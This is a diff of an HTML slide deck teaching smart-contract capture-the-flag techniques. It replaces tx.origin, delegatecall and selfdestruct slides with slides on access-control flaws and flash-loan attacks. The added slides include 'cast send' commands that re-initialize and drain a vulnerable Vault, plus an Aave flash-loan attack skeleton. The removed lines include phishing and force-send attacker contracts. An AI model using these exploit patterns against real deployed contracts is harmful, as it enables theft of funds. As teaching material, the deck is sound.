@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -541,11 +540,7 @@
           <li>Reentrancy Attacks</li>
           <li>Integer Overflow / Underflow</li>
           <li>Access Control Flaws</li>
-          <li>selfdestruct() Abuse</li>
-          <li>tx.origin Auth Bypass</li>
-          <li>Delegatecall Exploits</li>
           <li>Flash Loan Attacks</li>
-          <li>Frontrunning / MEV</li>
         </ul>
       </div>
       <div class="card green">
@@ -957,7 +952,7 @@
         <div class="step-num p">4</div>
         <div class="step-content">
           <strong>Check Known Vuln Patterns</strong>
-          <span>Reentrancy, overflow, tx.origin, delegatecall, selfdestruct, randomness (blockhash), flash loans, frontrunning — match against source.</span>
+          <span>Reentrancy, integer overflow/underflow, access control flaws, flash loan attacks — match each pattern against the source code.</span>
         </div>
       </li>
       <li>
@@ -1059,115 +1054,127 @@
   </div>
 </div>
 
-<!-- ── SLIDE 14: ACCESS CONTROL + TX.ORIGIN ── -->
+<!-- ── SLIDE 14: ACCESS CONTROL FLAWS ── -->
 <div class="slide" id="s14">
   <div class="scroll-content">
     <div class="section-tag" style="color:var(--cyan);background:rgba(0,245,255,0.08);border:1px solid rgba(0,245,255,0.2);">BLOCKCHAIN · VULN</div>
-    <div class="slide-title neon-cyan" style="font-size:clamp(18px,3vw,34px);">Access Control &amp; tx.origin</div>
+    <div class="slide-title neon-cyan" style="font-size:clamp(18px,3vw,34px);">Access Control Flaws</div>
     <div class="divider"></div>
     <div class="grid-2" style="margin-bottom:14px;">
       <div class="card cyan">
-        <h3 style="color:var(--cyan);">Missing Access Control</h3>
+        <h3 style="color:var(--cyan);">What Goes Wrong</h3>
         <ul>
-          <li>onlyOwner check missing → anyone calls admin function</li>
-          <li>Initializer not locked → re-initialize to set yourself as owner</li>
-          <li>public vs external vs internal visibility bugs</li>
-          <li>Look for: initialize(), setOwner(), changeOwner()</li>
+          <li>Missing onlyOwner modifier → anyone calls admin fn</li>
+          <li>Unlocked initializer → attacker re-runs initialize() to seize ownership</li>
+          <li>Wrong visibility: public instead of internal/private</li>
+          <li>Role checks on wrong variable (role vs. address)</li>
+          <li>Look for: initialize(), setOwner(), changeOwner(), mint()</li>
         </ul>
       </div>
       <div class="card purple">
-        <h3 style="color:var(--purple);">tx.origin Phishing</h3>
-        <p style="margin-bottom:10px;">tx.origin is the original EOA that started the tx, not the immediate caller. Trick the owner into calling your malicious contract → your contract calls Vault → tx.origin == owner → passes check.</p>
-        <pre style="padding:10px;font-size:11px;"><span class="cm">// ❌ Vulnerable</span>
-<span class="kw">require</span>(tx.origin == owner);
-<span class="cm">// ✅ Correct</span>
-<span class="kw">require</span>(msg.sender == owner);</pre>
+        <h3 style="color:var(--purple);">CTF Attack Steps</h3>
+        <ul>
+          <li>List every public/external function — spot unprotected admin fns</li>
+          <li>Check if initialize() is callable again → call it with your address</li>
+          <li>Look for functions that change owner/admin with no restriction</li>
+          <li>OpenZeppelin Ownable: check transferOwnership() is guarded</li>
+          <li>After gaining owner: call privileged functions to win challenge</li>
+        </ul>
       </div>
     </div>
-    <pre><span class="cm">// Attacker contract — exploits tx.origin</span>
-<span class="kw">contract</span> <span class="fn">PhishingAttack</span> {
-  <span class="fn">TxOriginVault</span> <span class="kw">public</span> <span class="var">vault</span>;
-  <span class="kw">address payable</span> <span class="kw">public</span> <span class="var">attacker</span>;
-  <span class="kw">constructor</span>(<span class="kw">address</span> <span class="var">_vault</span>) { vault = <span class="fn">TxOriginVault</span>(_vault); attacker = payable(msg.sender); }
-  <span class="kw">receive</span>() <span class="kw">external payable</span> {
-    vault.<span class="fn">transferOwnership</span>(attacker);  <span class="cm">// called when owner sends ETH here</span>
+    <pre><span class="cm">// ❌ VULNERABLE — no access control</span>
+<span class="kw">contract</span> <span class="fn">Vault</span> {
+  <span class="kw">address public</span> <span class="var">owner</span>;
+  <span class="kw">function</span> <span class="fn">initialize</span>(<span class="kw">address</span> <span class="var">_owner</span>) <span class="kw">public</span> {   <span class="cm">// ← no initializer guard!</span>
+    owner = _owner;
+  }
+  <span class="kw">function</span> <span class="fn">withdrawAll</span>() <span class="kw">public</span> {                   <span class="cm">// ← missing onlyOwner!</span>
+    payable(msg.sender).<span class="fn">transfer</span>(<span class="kw">address</span>(<span class="kw">this</span>).balance);
   }
 }
-</pre>
+
+<span class="cm">// ✅ EXPLOIT — call initialize again, then drain</span>
+<span class="fn">cast</span> send &lt;addr&gt; <span class="str">"initialize(address)"</span> $ATTACKER --private-key $PK
+<span class="fn">cast</span> send &lt;addr&gt; <span class="str">"withdrawAll()"</span> --private-key $PK
+
+<span class="cm">// ✅ FIX</span>
+<span class="kw">bool private</span> <span class="var">initialized</span>;
+<span class="kw">function</span> <span class="fn">initialize</span>(<span class="kw">address</span> <span class="var">_owner</span>) <span class="kw">public</span> {
+  <span class="kw">require</span>(!initialized, <span class="str">"already init"</span>);
+  initialized = <span class="kw">true</span>; owner = _owner;
+}</pre>
   </div>
 </div>
 
-<!-- ── SLIDE 15: SELFDESTRUCT + DELEGATECALL ── -->
+<!-- ── SLIDE 15: FLASH LOAN ATTACKS ── -->
 <div class="slide" id="s15">
   <div class="scroll-content">
-    <div class="section-tag" style="color:var(--green);background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.2);">BLOCKCHAIN · VULN</div>
-    <div class="slide-title neon-green" style="font-size:clamp(18px,3vw,34px);">selfdestruct &amp; delegatecall</div>
+    <div class="section-tag" style="color:var(--purple);background:rgba(168,85,247,0.08);border:1px solid rgba(168,85,247,0.2);">BLOCKCHAIN · VULN</div>
+    <div class="slide-title neon-purple" style="font-size:clamp(18px,3vw,34px);">Flash Loan Attacks</div>
     <div class="divider"></div>
     <div class="grid-2" style="margin-bottom:14px;">
-      <div class="card green">
-        <h3 style="color:var(--green);">selfdestruct() Force-Send</h3>
-        <p style="margin-bottom:8px;">selfdestruct sends all ETH to an address bypassing receive()/fallback(). If contract logic checks <code style="color:var(--green);">address(this).balance == 0</code> you can break it by force-sending ETH.</p>
-        <pre style="padding:10px;font-size:11px;"><span class="kw">contract</span> <span class="fn">Bomb</span> {
-  <span class="kw">constructor</span>(<span class="kw">address payable</span> <span class="var">target</span>) <span class="kw">payable</span> {
-    <span class="kw">selfdestruct</span>(target);  <span class="cm">// force sends ETH</span>
+      <div class="card purple">
+        <h3 style="color:var(--purple);">What Is a Flash Loan?</h3>
+        <p style="margin-bottom:10px;">Borrow any amount of tokens with <strong>zero collateral</strong> — as long as it is repaid within the <em>same transaction</em>. If repayment fails, the whole tx reverts.</p>
+        <ul>
+          <li>Available from: Aave, dYdX, Uniswap V3</li>
+          <li>No credit check, no collateral required</li>
+          <li>Borrow millions of $ for a few seconds</li>
+          <li>Classic CTF: drain a DeFi pool in one tx</li>
+        </ul>
+      </div>
+      <div class="card cyan">
+        <h3 style="color:var(--cyan);">Attack Flow</h3>
+        <ul>
+          <li>1️⃣ Borrow huge amount (e.g. 1M USDC) from flash loan provider</li>
+          <li>2️⃣ Manipulate price oracle (spot price) with the borrowed funds</li>
+          <li>3️⃣ Exploit mispriced collateral → drain under-collateralised borrows</li>
+          <li>4️⃣ Or: pass a governance vote with borrowed voting tokens</li>
+          <li>5️⃣ Repay flash loan + fee → keep profit</li>
+        </ul>
+      </div>
+    </div>
+    <pre><span class="cm">// Flash Loan Attack skeleton (Aave V2)</span>
+<span class="kw">contract</span> <span class="fn">FlashAttack</span> <span class="kw">is</span> <span class="fn">IFlashLoanReceiver</span> {
+  <span class="fn">ILendingPool</span> <span class="kw">pool</span> = <span class="fn">ILendingPool</span>(<span class="str">AAVE_POOL</span>);
+
+  <span class="kw">function</span> <span class="fn">attack</span>() <span class="kw">external</span> {
+    <span class="kw">address</span>[] <span class="kw">memory</span> <span class="var">assets</span> = <span class="kw">new</span> <span class="kw">address</span>[](<span class="num">1</span>);
+    assets[<span class="num">0</span>] = USDC;
+    <span class="kw">uint256</span>[] <span class="kw">memory</span> <span class="var">amounts</span> = <span class="kw">new</span> <span class="kw">uint256</span>[](<span class="num">1</span>);
+    amounts[<span class="num">0</span>] = <span class="num">1_000_000e6</span>;  <span class="cm">// borrow 1M USDC</span>
+    pool.<span class="fn">flashLoan</span>(<span class="kw">address</span>(<span class="kw">this</span>), assets, amounts, ...);
   }
-}</pre>
+
+  <span class="kw">function</span> <span class="fn">executeOperation</span>(...) <span class="kw">external override returns</span> (<span class="kw">bool</span>) {
+    <span class="cm">// ← exploit happens here with 1M USDC in hand</span>
+    vulnerableProtocol.<span class="fn">drain</span>();          <span class="cm">// manipulate oracle / drain pool</span>
+    USDC.<span class="fn">approve</span>(<span class="kw">address</span>(pool), amounts[<span class="num">0</span>] + premium);
+    <span class="kw">return true</span>;                           <span class="cm">// repay loan</span>
+  }
+}
+
+<span class="cm">// Vulnerable: pool uses spot price as oracle</span>
+<span class="cm">// Attack: inflate price → borrow more than allowed → repay flash loan → profit</span></pre>
+    <div class="grid-2" style="margin-top:4px;">
+      <div class="card green">
+        <h3 style="color:var(--green);">Common CTF Targets</h3>
+        <ul>
+          <li>Spot-price oracles (Uniswap V2 pair)</li>
+          <li>Single-block governance votes</li>
+          <li>Re-entrancy amplified by flash loan capital</li>
+          <li>Liquidity pool imbalance exploits</li>
+        </ul>
       </div>
       <div class="card orange">
-        <h3 style="color:var(--orange);">delegatecall Storage Collision</h3>
-        <p style="margin-bottom:8px;">delegatecall runs callee's code in caller's storage context. If slot layouts differ, you can overwrite critical variables like owner.</p>
+        <h3 style="color:var(--orange);">CTF Solve Tips</h3>
         <ul>
-          <li>Find contracts using delegatecall with user-controlled data</li>
-          <li>Map storage slot 0 of callee → overwrites slot 0 of caller (owner!)</li>
-          <li>Classic: Parity Wallet hack (2017)</li>
+          <li>Find: how does the contract get a price? (spot? TWAP?)</li>
+          <li>Spot price = manipulable → flash loan attack likely</li>
+          <li>Use Foundry fork: anvil --fork-url $RPC</li>
+          <li>forge test -vvvv to debug attack contract</li>
         </ul>
       </div>
-    </div>
-    <div class="card cyan" style="max-width:900px;">
-      <h3 style="color:var(--cyan);">Delegatecall CTF Example (Ethernaut — Delegation)</h3>
-      <pre style="background:transparent;border:none;padding:0;margin-top:8px;"><span class="cm">// Proxy contract uses delegatecall to Delegate contract</span>
-<span class="cm">// Goal: become owner of Proxy</span>
-<span class="cm">// Delegate has: function pwn() public { owner = msg.sender; }</span>
-<span class="cm">// Send tx to Proxy with data = keccak256("pwn()")[0:4]</span>
-<span class="fn">cast</span> send &lt;proxy&gt; <span class="str">"pwn()"</span> --private-key $PK
-<span class="cm">// delegatecall executes pwn() in Proxy's storage → Proxy.owner = you</span></pre>
-    </div>
-  </div>
-</div>
-
-<!-- ── SLIDE 16: RANDOMNESS + FLASHLOANS ── -->
-<div class="slide" id="s16">
-  <div class="scroll-content">
-    <div class="section-tag" style="color:var(--yellow);background:rgba(255,215,0,0.08);border:1px solid rgba(255,215,0,0.2);">BLOCKCHAIN · VULN</div>
-    <div class="slide-title" style="font-size:clamp(18px,3vw,34px);color:var(--yellow);text-shadow:0 0 30px rgba(255,215,0,0.5);">Weak Randomness &amp; Flash Loans</div>
-    <div class="divider"></div>
-    <div class="grid-2">
-      <div class="card yellow">
-        <h3 style="color:var(--yellow);">Predictable Randomness</h3>
-        <p style="margin-bottom:8px;">blockhash, block.timestamp, block.number are knowable by miners and computed attackers IN the same transaction.</p>
-        <ul>
-          <li>Replicate the random formula in your attacker contract</li>
-          <li>Call the target in the same transaction → same block values</li>
-          <li>You compute the "winning" value before calling</li>
-        </ul>
-        <pre style="background:transparent;border:none;padding:0;margin-top:8px;font-size:11px;"><span class="kw">uint</span> <span class="var">answer</span> = <span class="kw">uint</span>(<span class="fn">keccak256</span>(<span class="kw">abi.encodePacked</span>(
-  <span class="fn">blockhash</span>(<span class="fn">block.number</span><span class="op">-</span><span class="num">1</span>),
-  block.timestamp)));   <span class="cm">// ❌ predictable</span></pre>
-      </div>
-      <div class="card purple">
-        <h3 style="color:var(--purple);">Flash Loan Attacks</h3>
-        <p style="margin-bottom:8px;">Borrow a huge amount of tokens with no collateral — returned in same tx. Use to: manipulate price oracles, bypass balance checks, drain governance.</p>
-        <ul>
-          <li>Borrow 1M USDC in 1 tx</li>
-          <li>Crash/spike a price oracle</li>
-          <li>Exploit: under-collateralised borrow, liquidation, governance vote</li>
-          <li>Return loan → profit kept</li>
-        </ul>
-      </div>
-    </div>
-    <div class="card green" style="max-width:900px;margin-top:0px;">
-      <h3 style="color:var(--green);">Frontrunning / MEV</h3>
-      <p>Transactions in mempool are visible before confirmation. MEV bots copy your tx with higher gas price to execute first. CTF angle: commit-reveal schemes, block order dependency bugs.</p>
     </div>
   </div>
 </div>
@@ -1284,12 +1291,11 @@
       <div class="card green">
         <h3 style="color:var(--green);">🔑 Common Patterns</h3>
         <ul>
-          <li>☐ Reentrancy: sends ETH before update?</li>
-          <li>☐ tx.origin auth bypass</li>
-          <li>☐ blockhash/timestamp randomness?</li>
-          <li>☐ selfdestruct force-send balance check?</li>
-          <li>☐ Delegatecall storage collision?</li>
-          <li>☐ Integer overflow (old version)?</li>
+          <li>☐ Reentrancy: sends ETH before balance update?</li>
+          <li>☐ Integer overflow: pragma &lt;0.8 with no SafeMath?</li>
+          <li>☐ Access control: missing onlyOwner / unlocked initializer?</li>
+          <li>☐ Flash loan: spot-price oracle manipulable?</li>
+          <li>☐ Single-block governance vote bypass?</li>
           <li>☐ Unchecked external call return value?</li>
         </ul>
       </div>
@@ -1377,7 +1383,7 @@
       <div class="card purple">
         <h3 style="color:var(--purple);font-size:22px;text-align:center;margin-bottom:8px;">⛓️</h3>
         <h3 style="color:var(--purple);text-align:center;">BLOCKCHAIN</h3>
-        <p style="font-size:12px;text-align:center;">Reentrancy → Overflow → Access → Delegatecall → Randomness → Flash</p>
+        <p style="font-size:12px;text-align:center;">Reentrancy → Overflow → Access Control → Flash Loans</p>
       </div>
       <div class="card cyan">
         <h3 style="color:var(--cyan);font-size:22px;text-align:center;margin-bottom:8px;">🧭</h3>
@@ -1400,7 +1406,7 @@
 <!-- ── NAV ── -->
 <div id="nav">
   <button id="btn-prev" onclick="changeSlide(-1)" disabled>◀ PREV</button>
-  <span id="slide-counter">1 / 21</span>
+  <span id="slide-counter">1 / 20</span>
   <button id="btn-next" onclick="changeSlide(1)">NEXT ▶</button>
 </div>
 
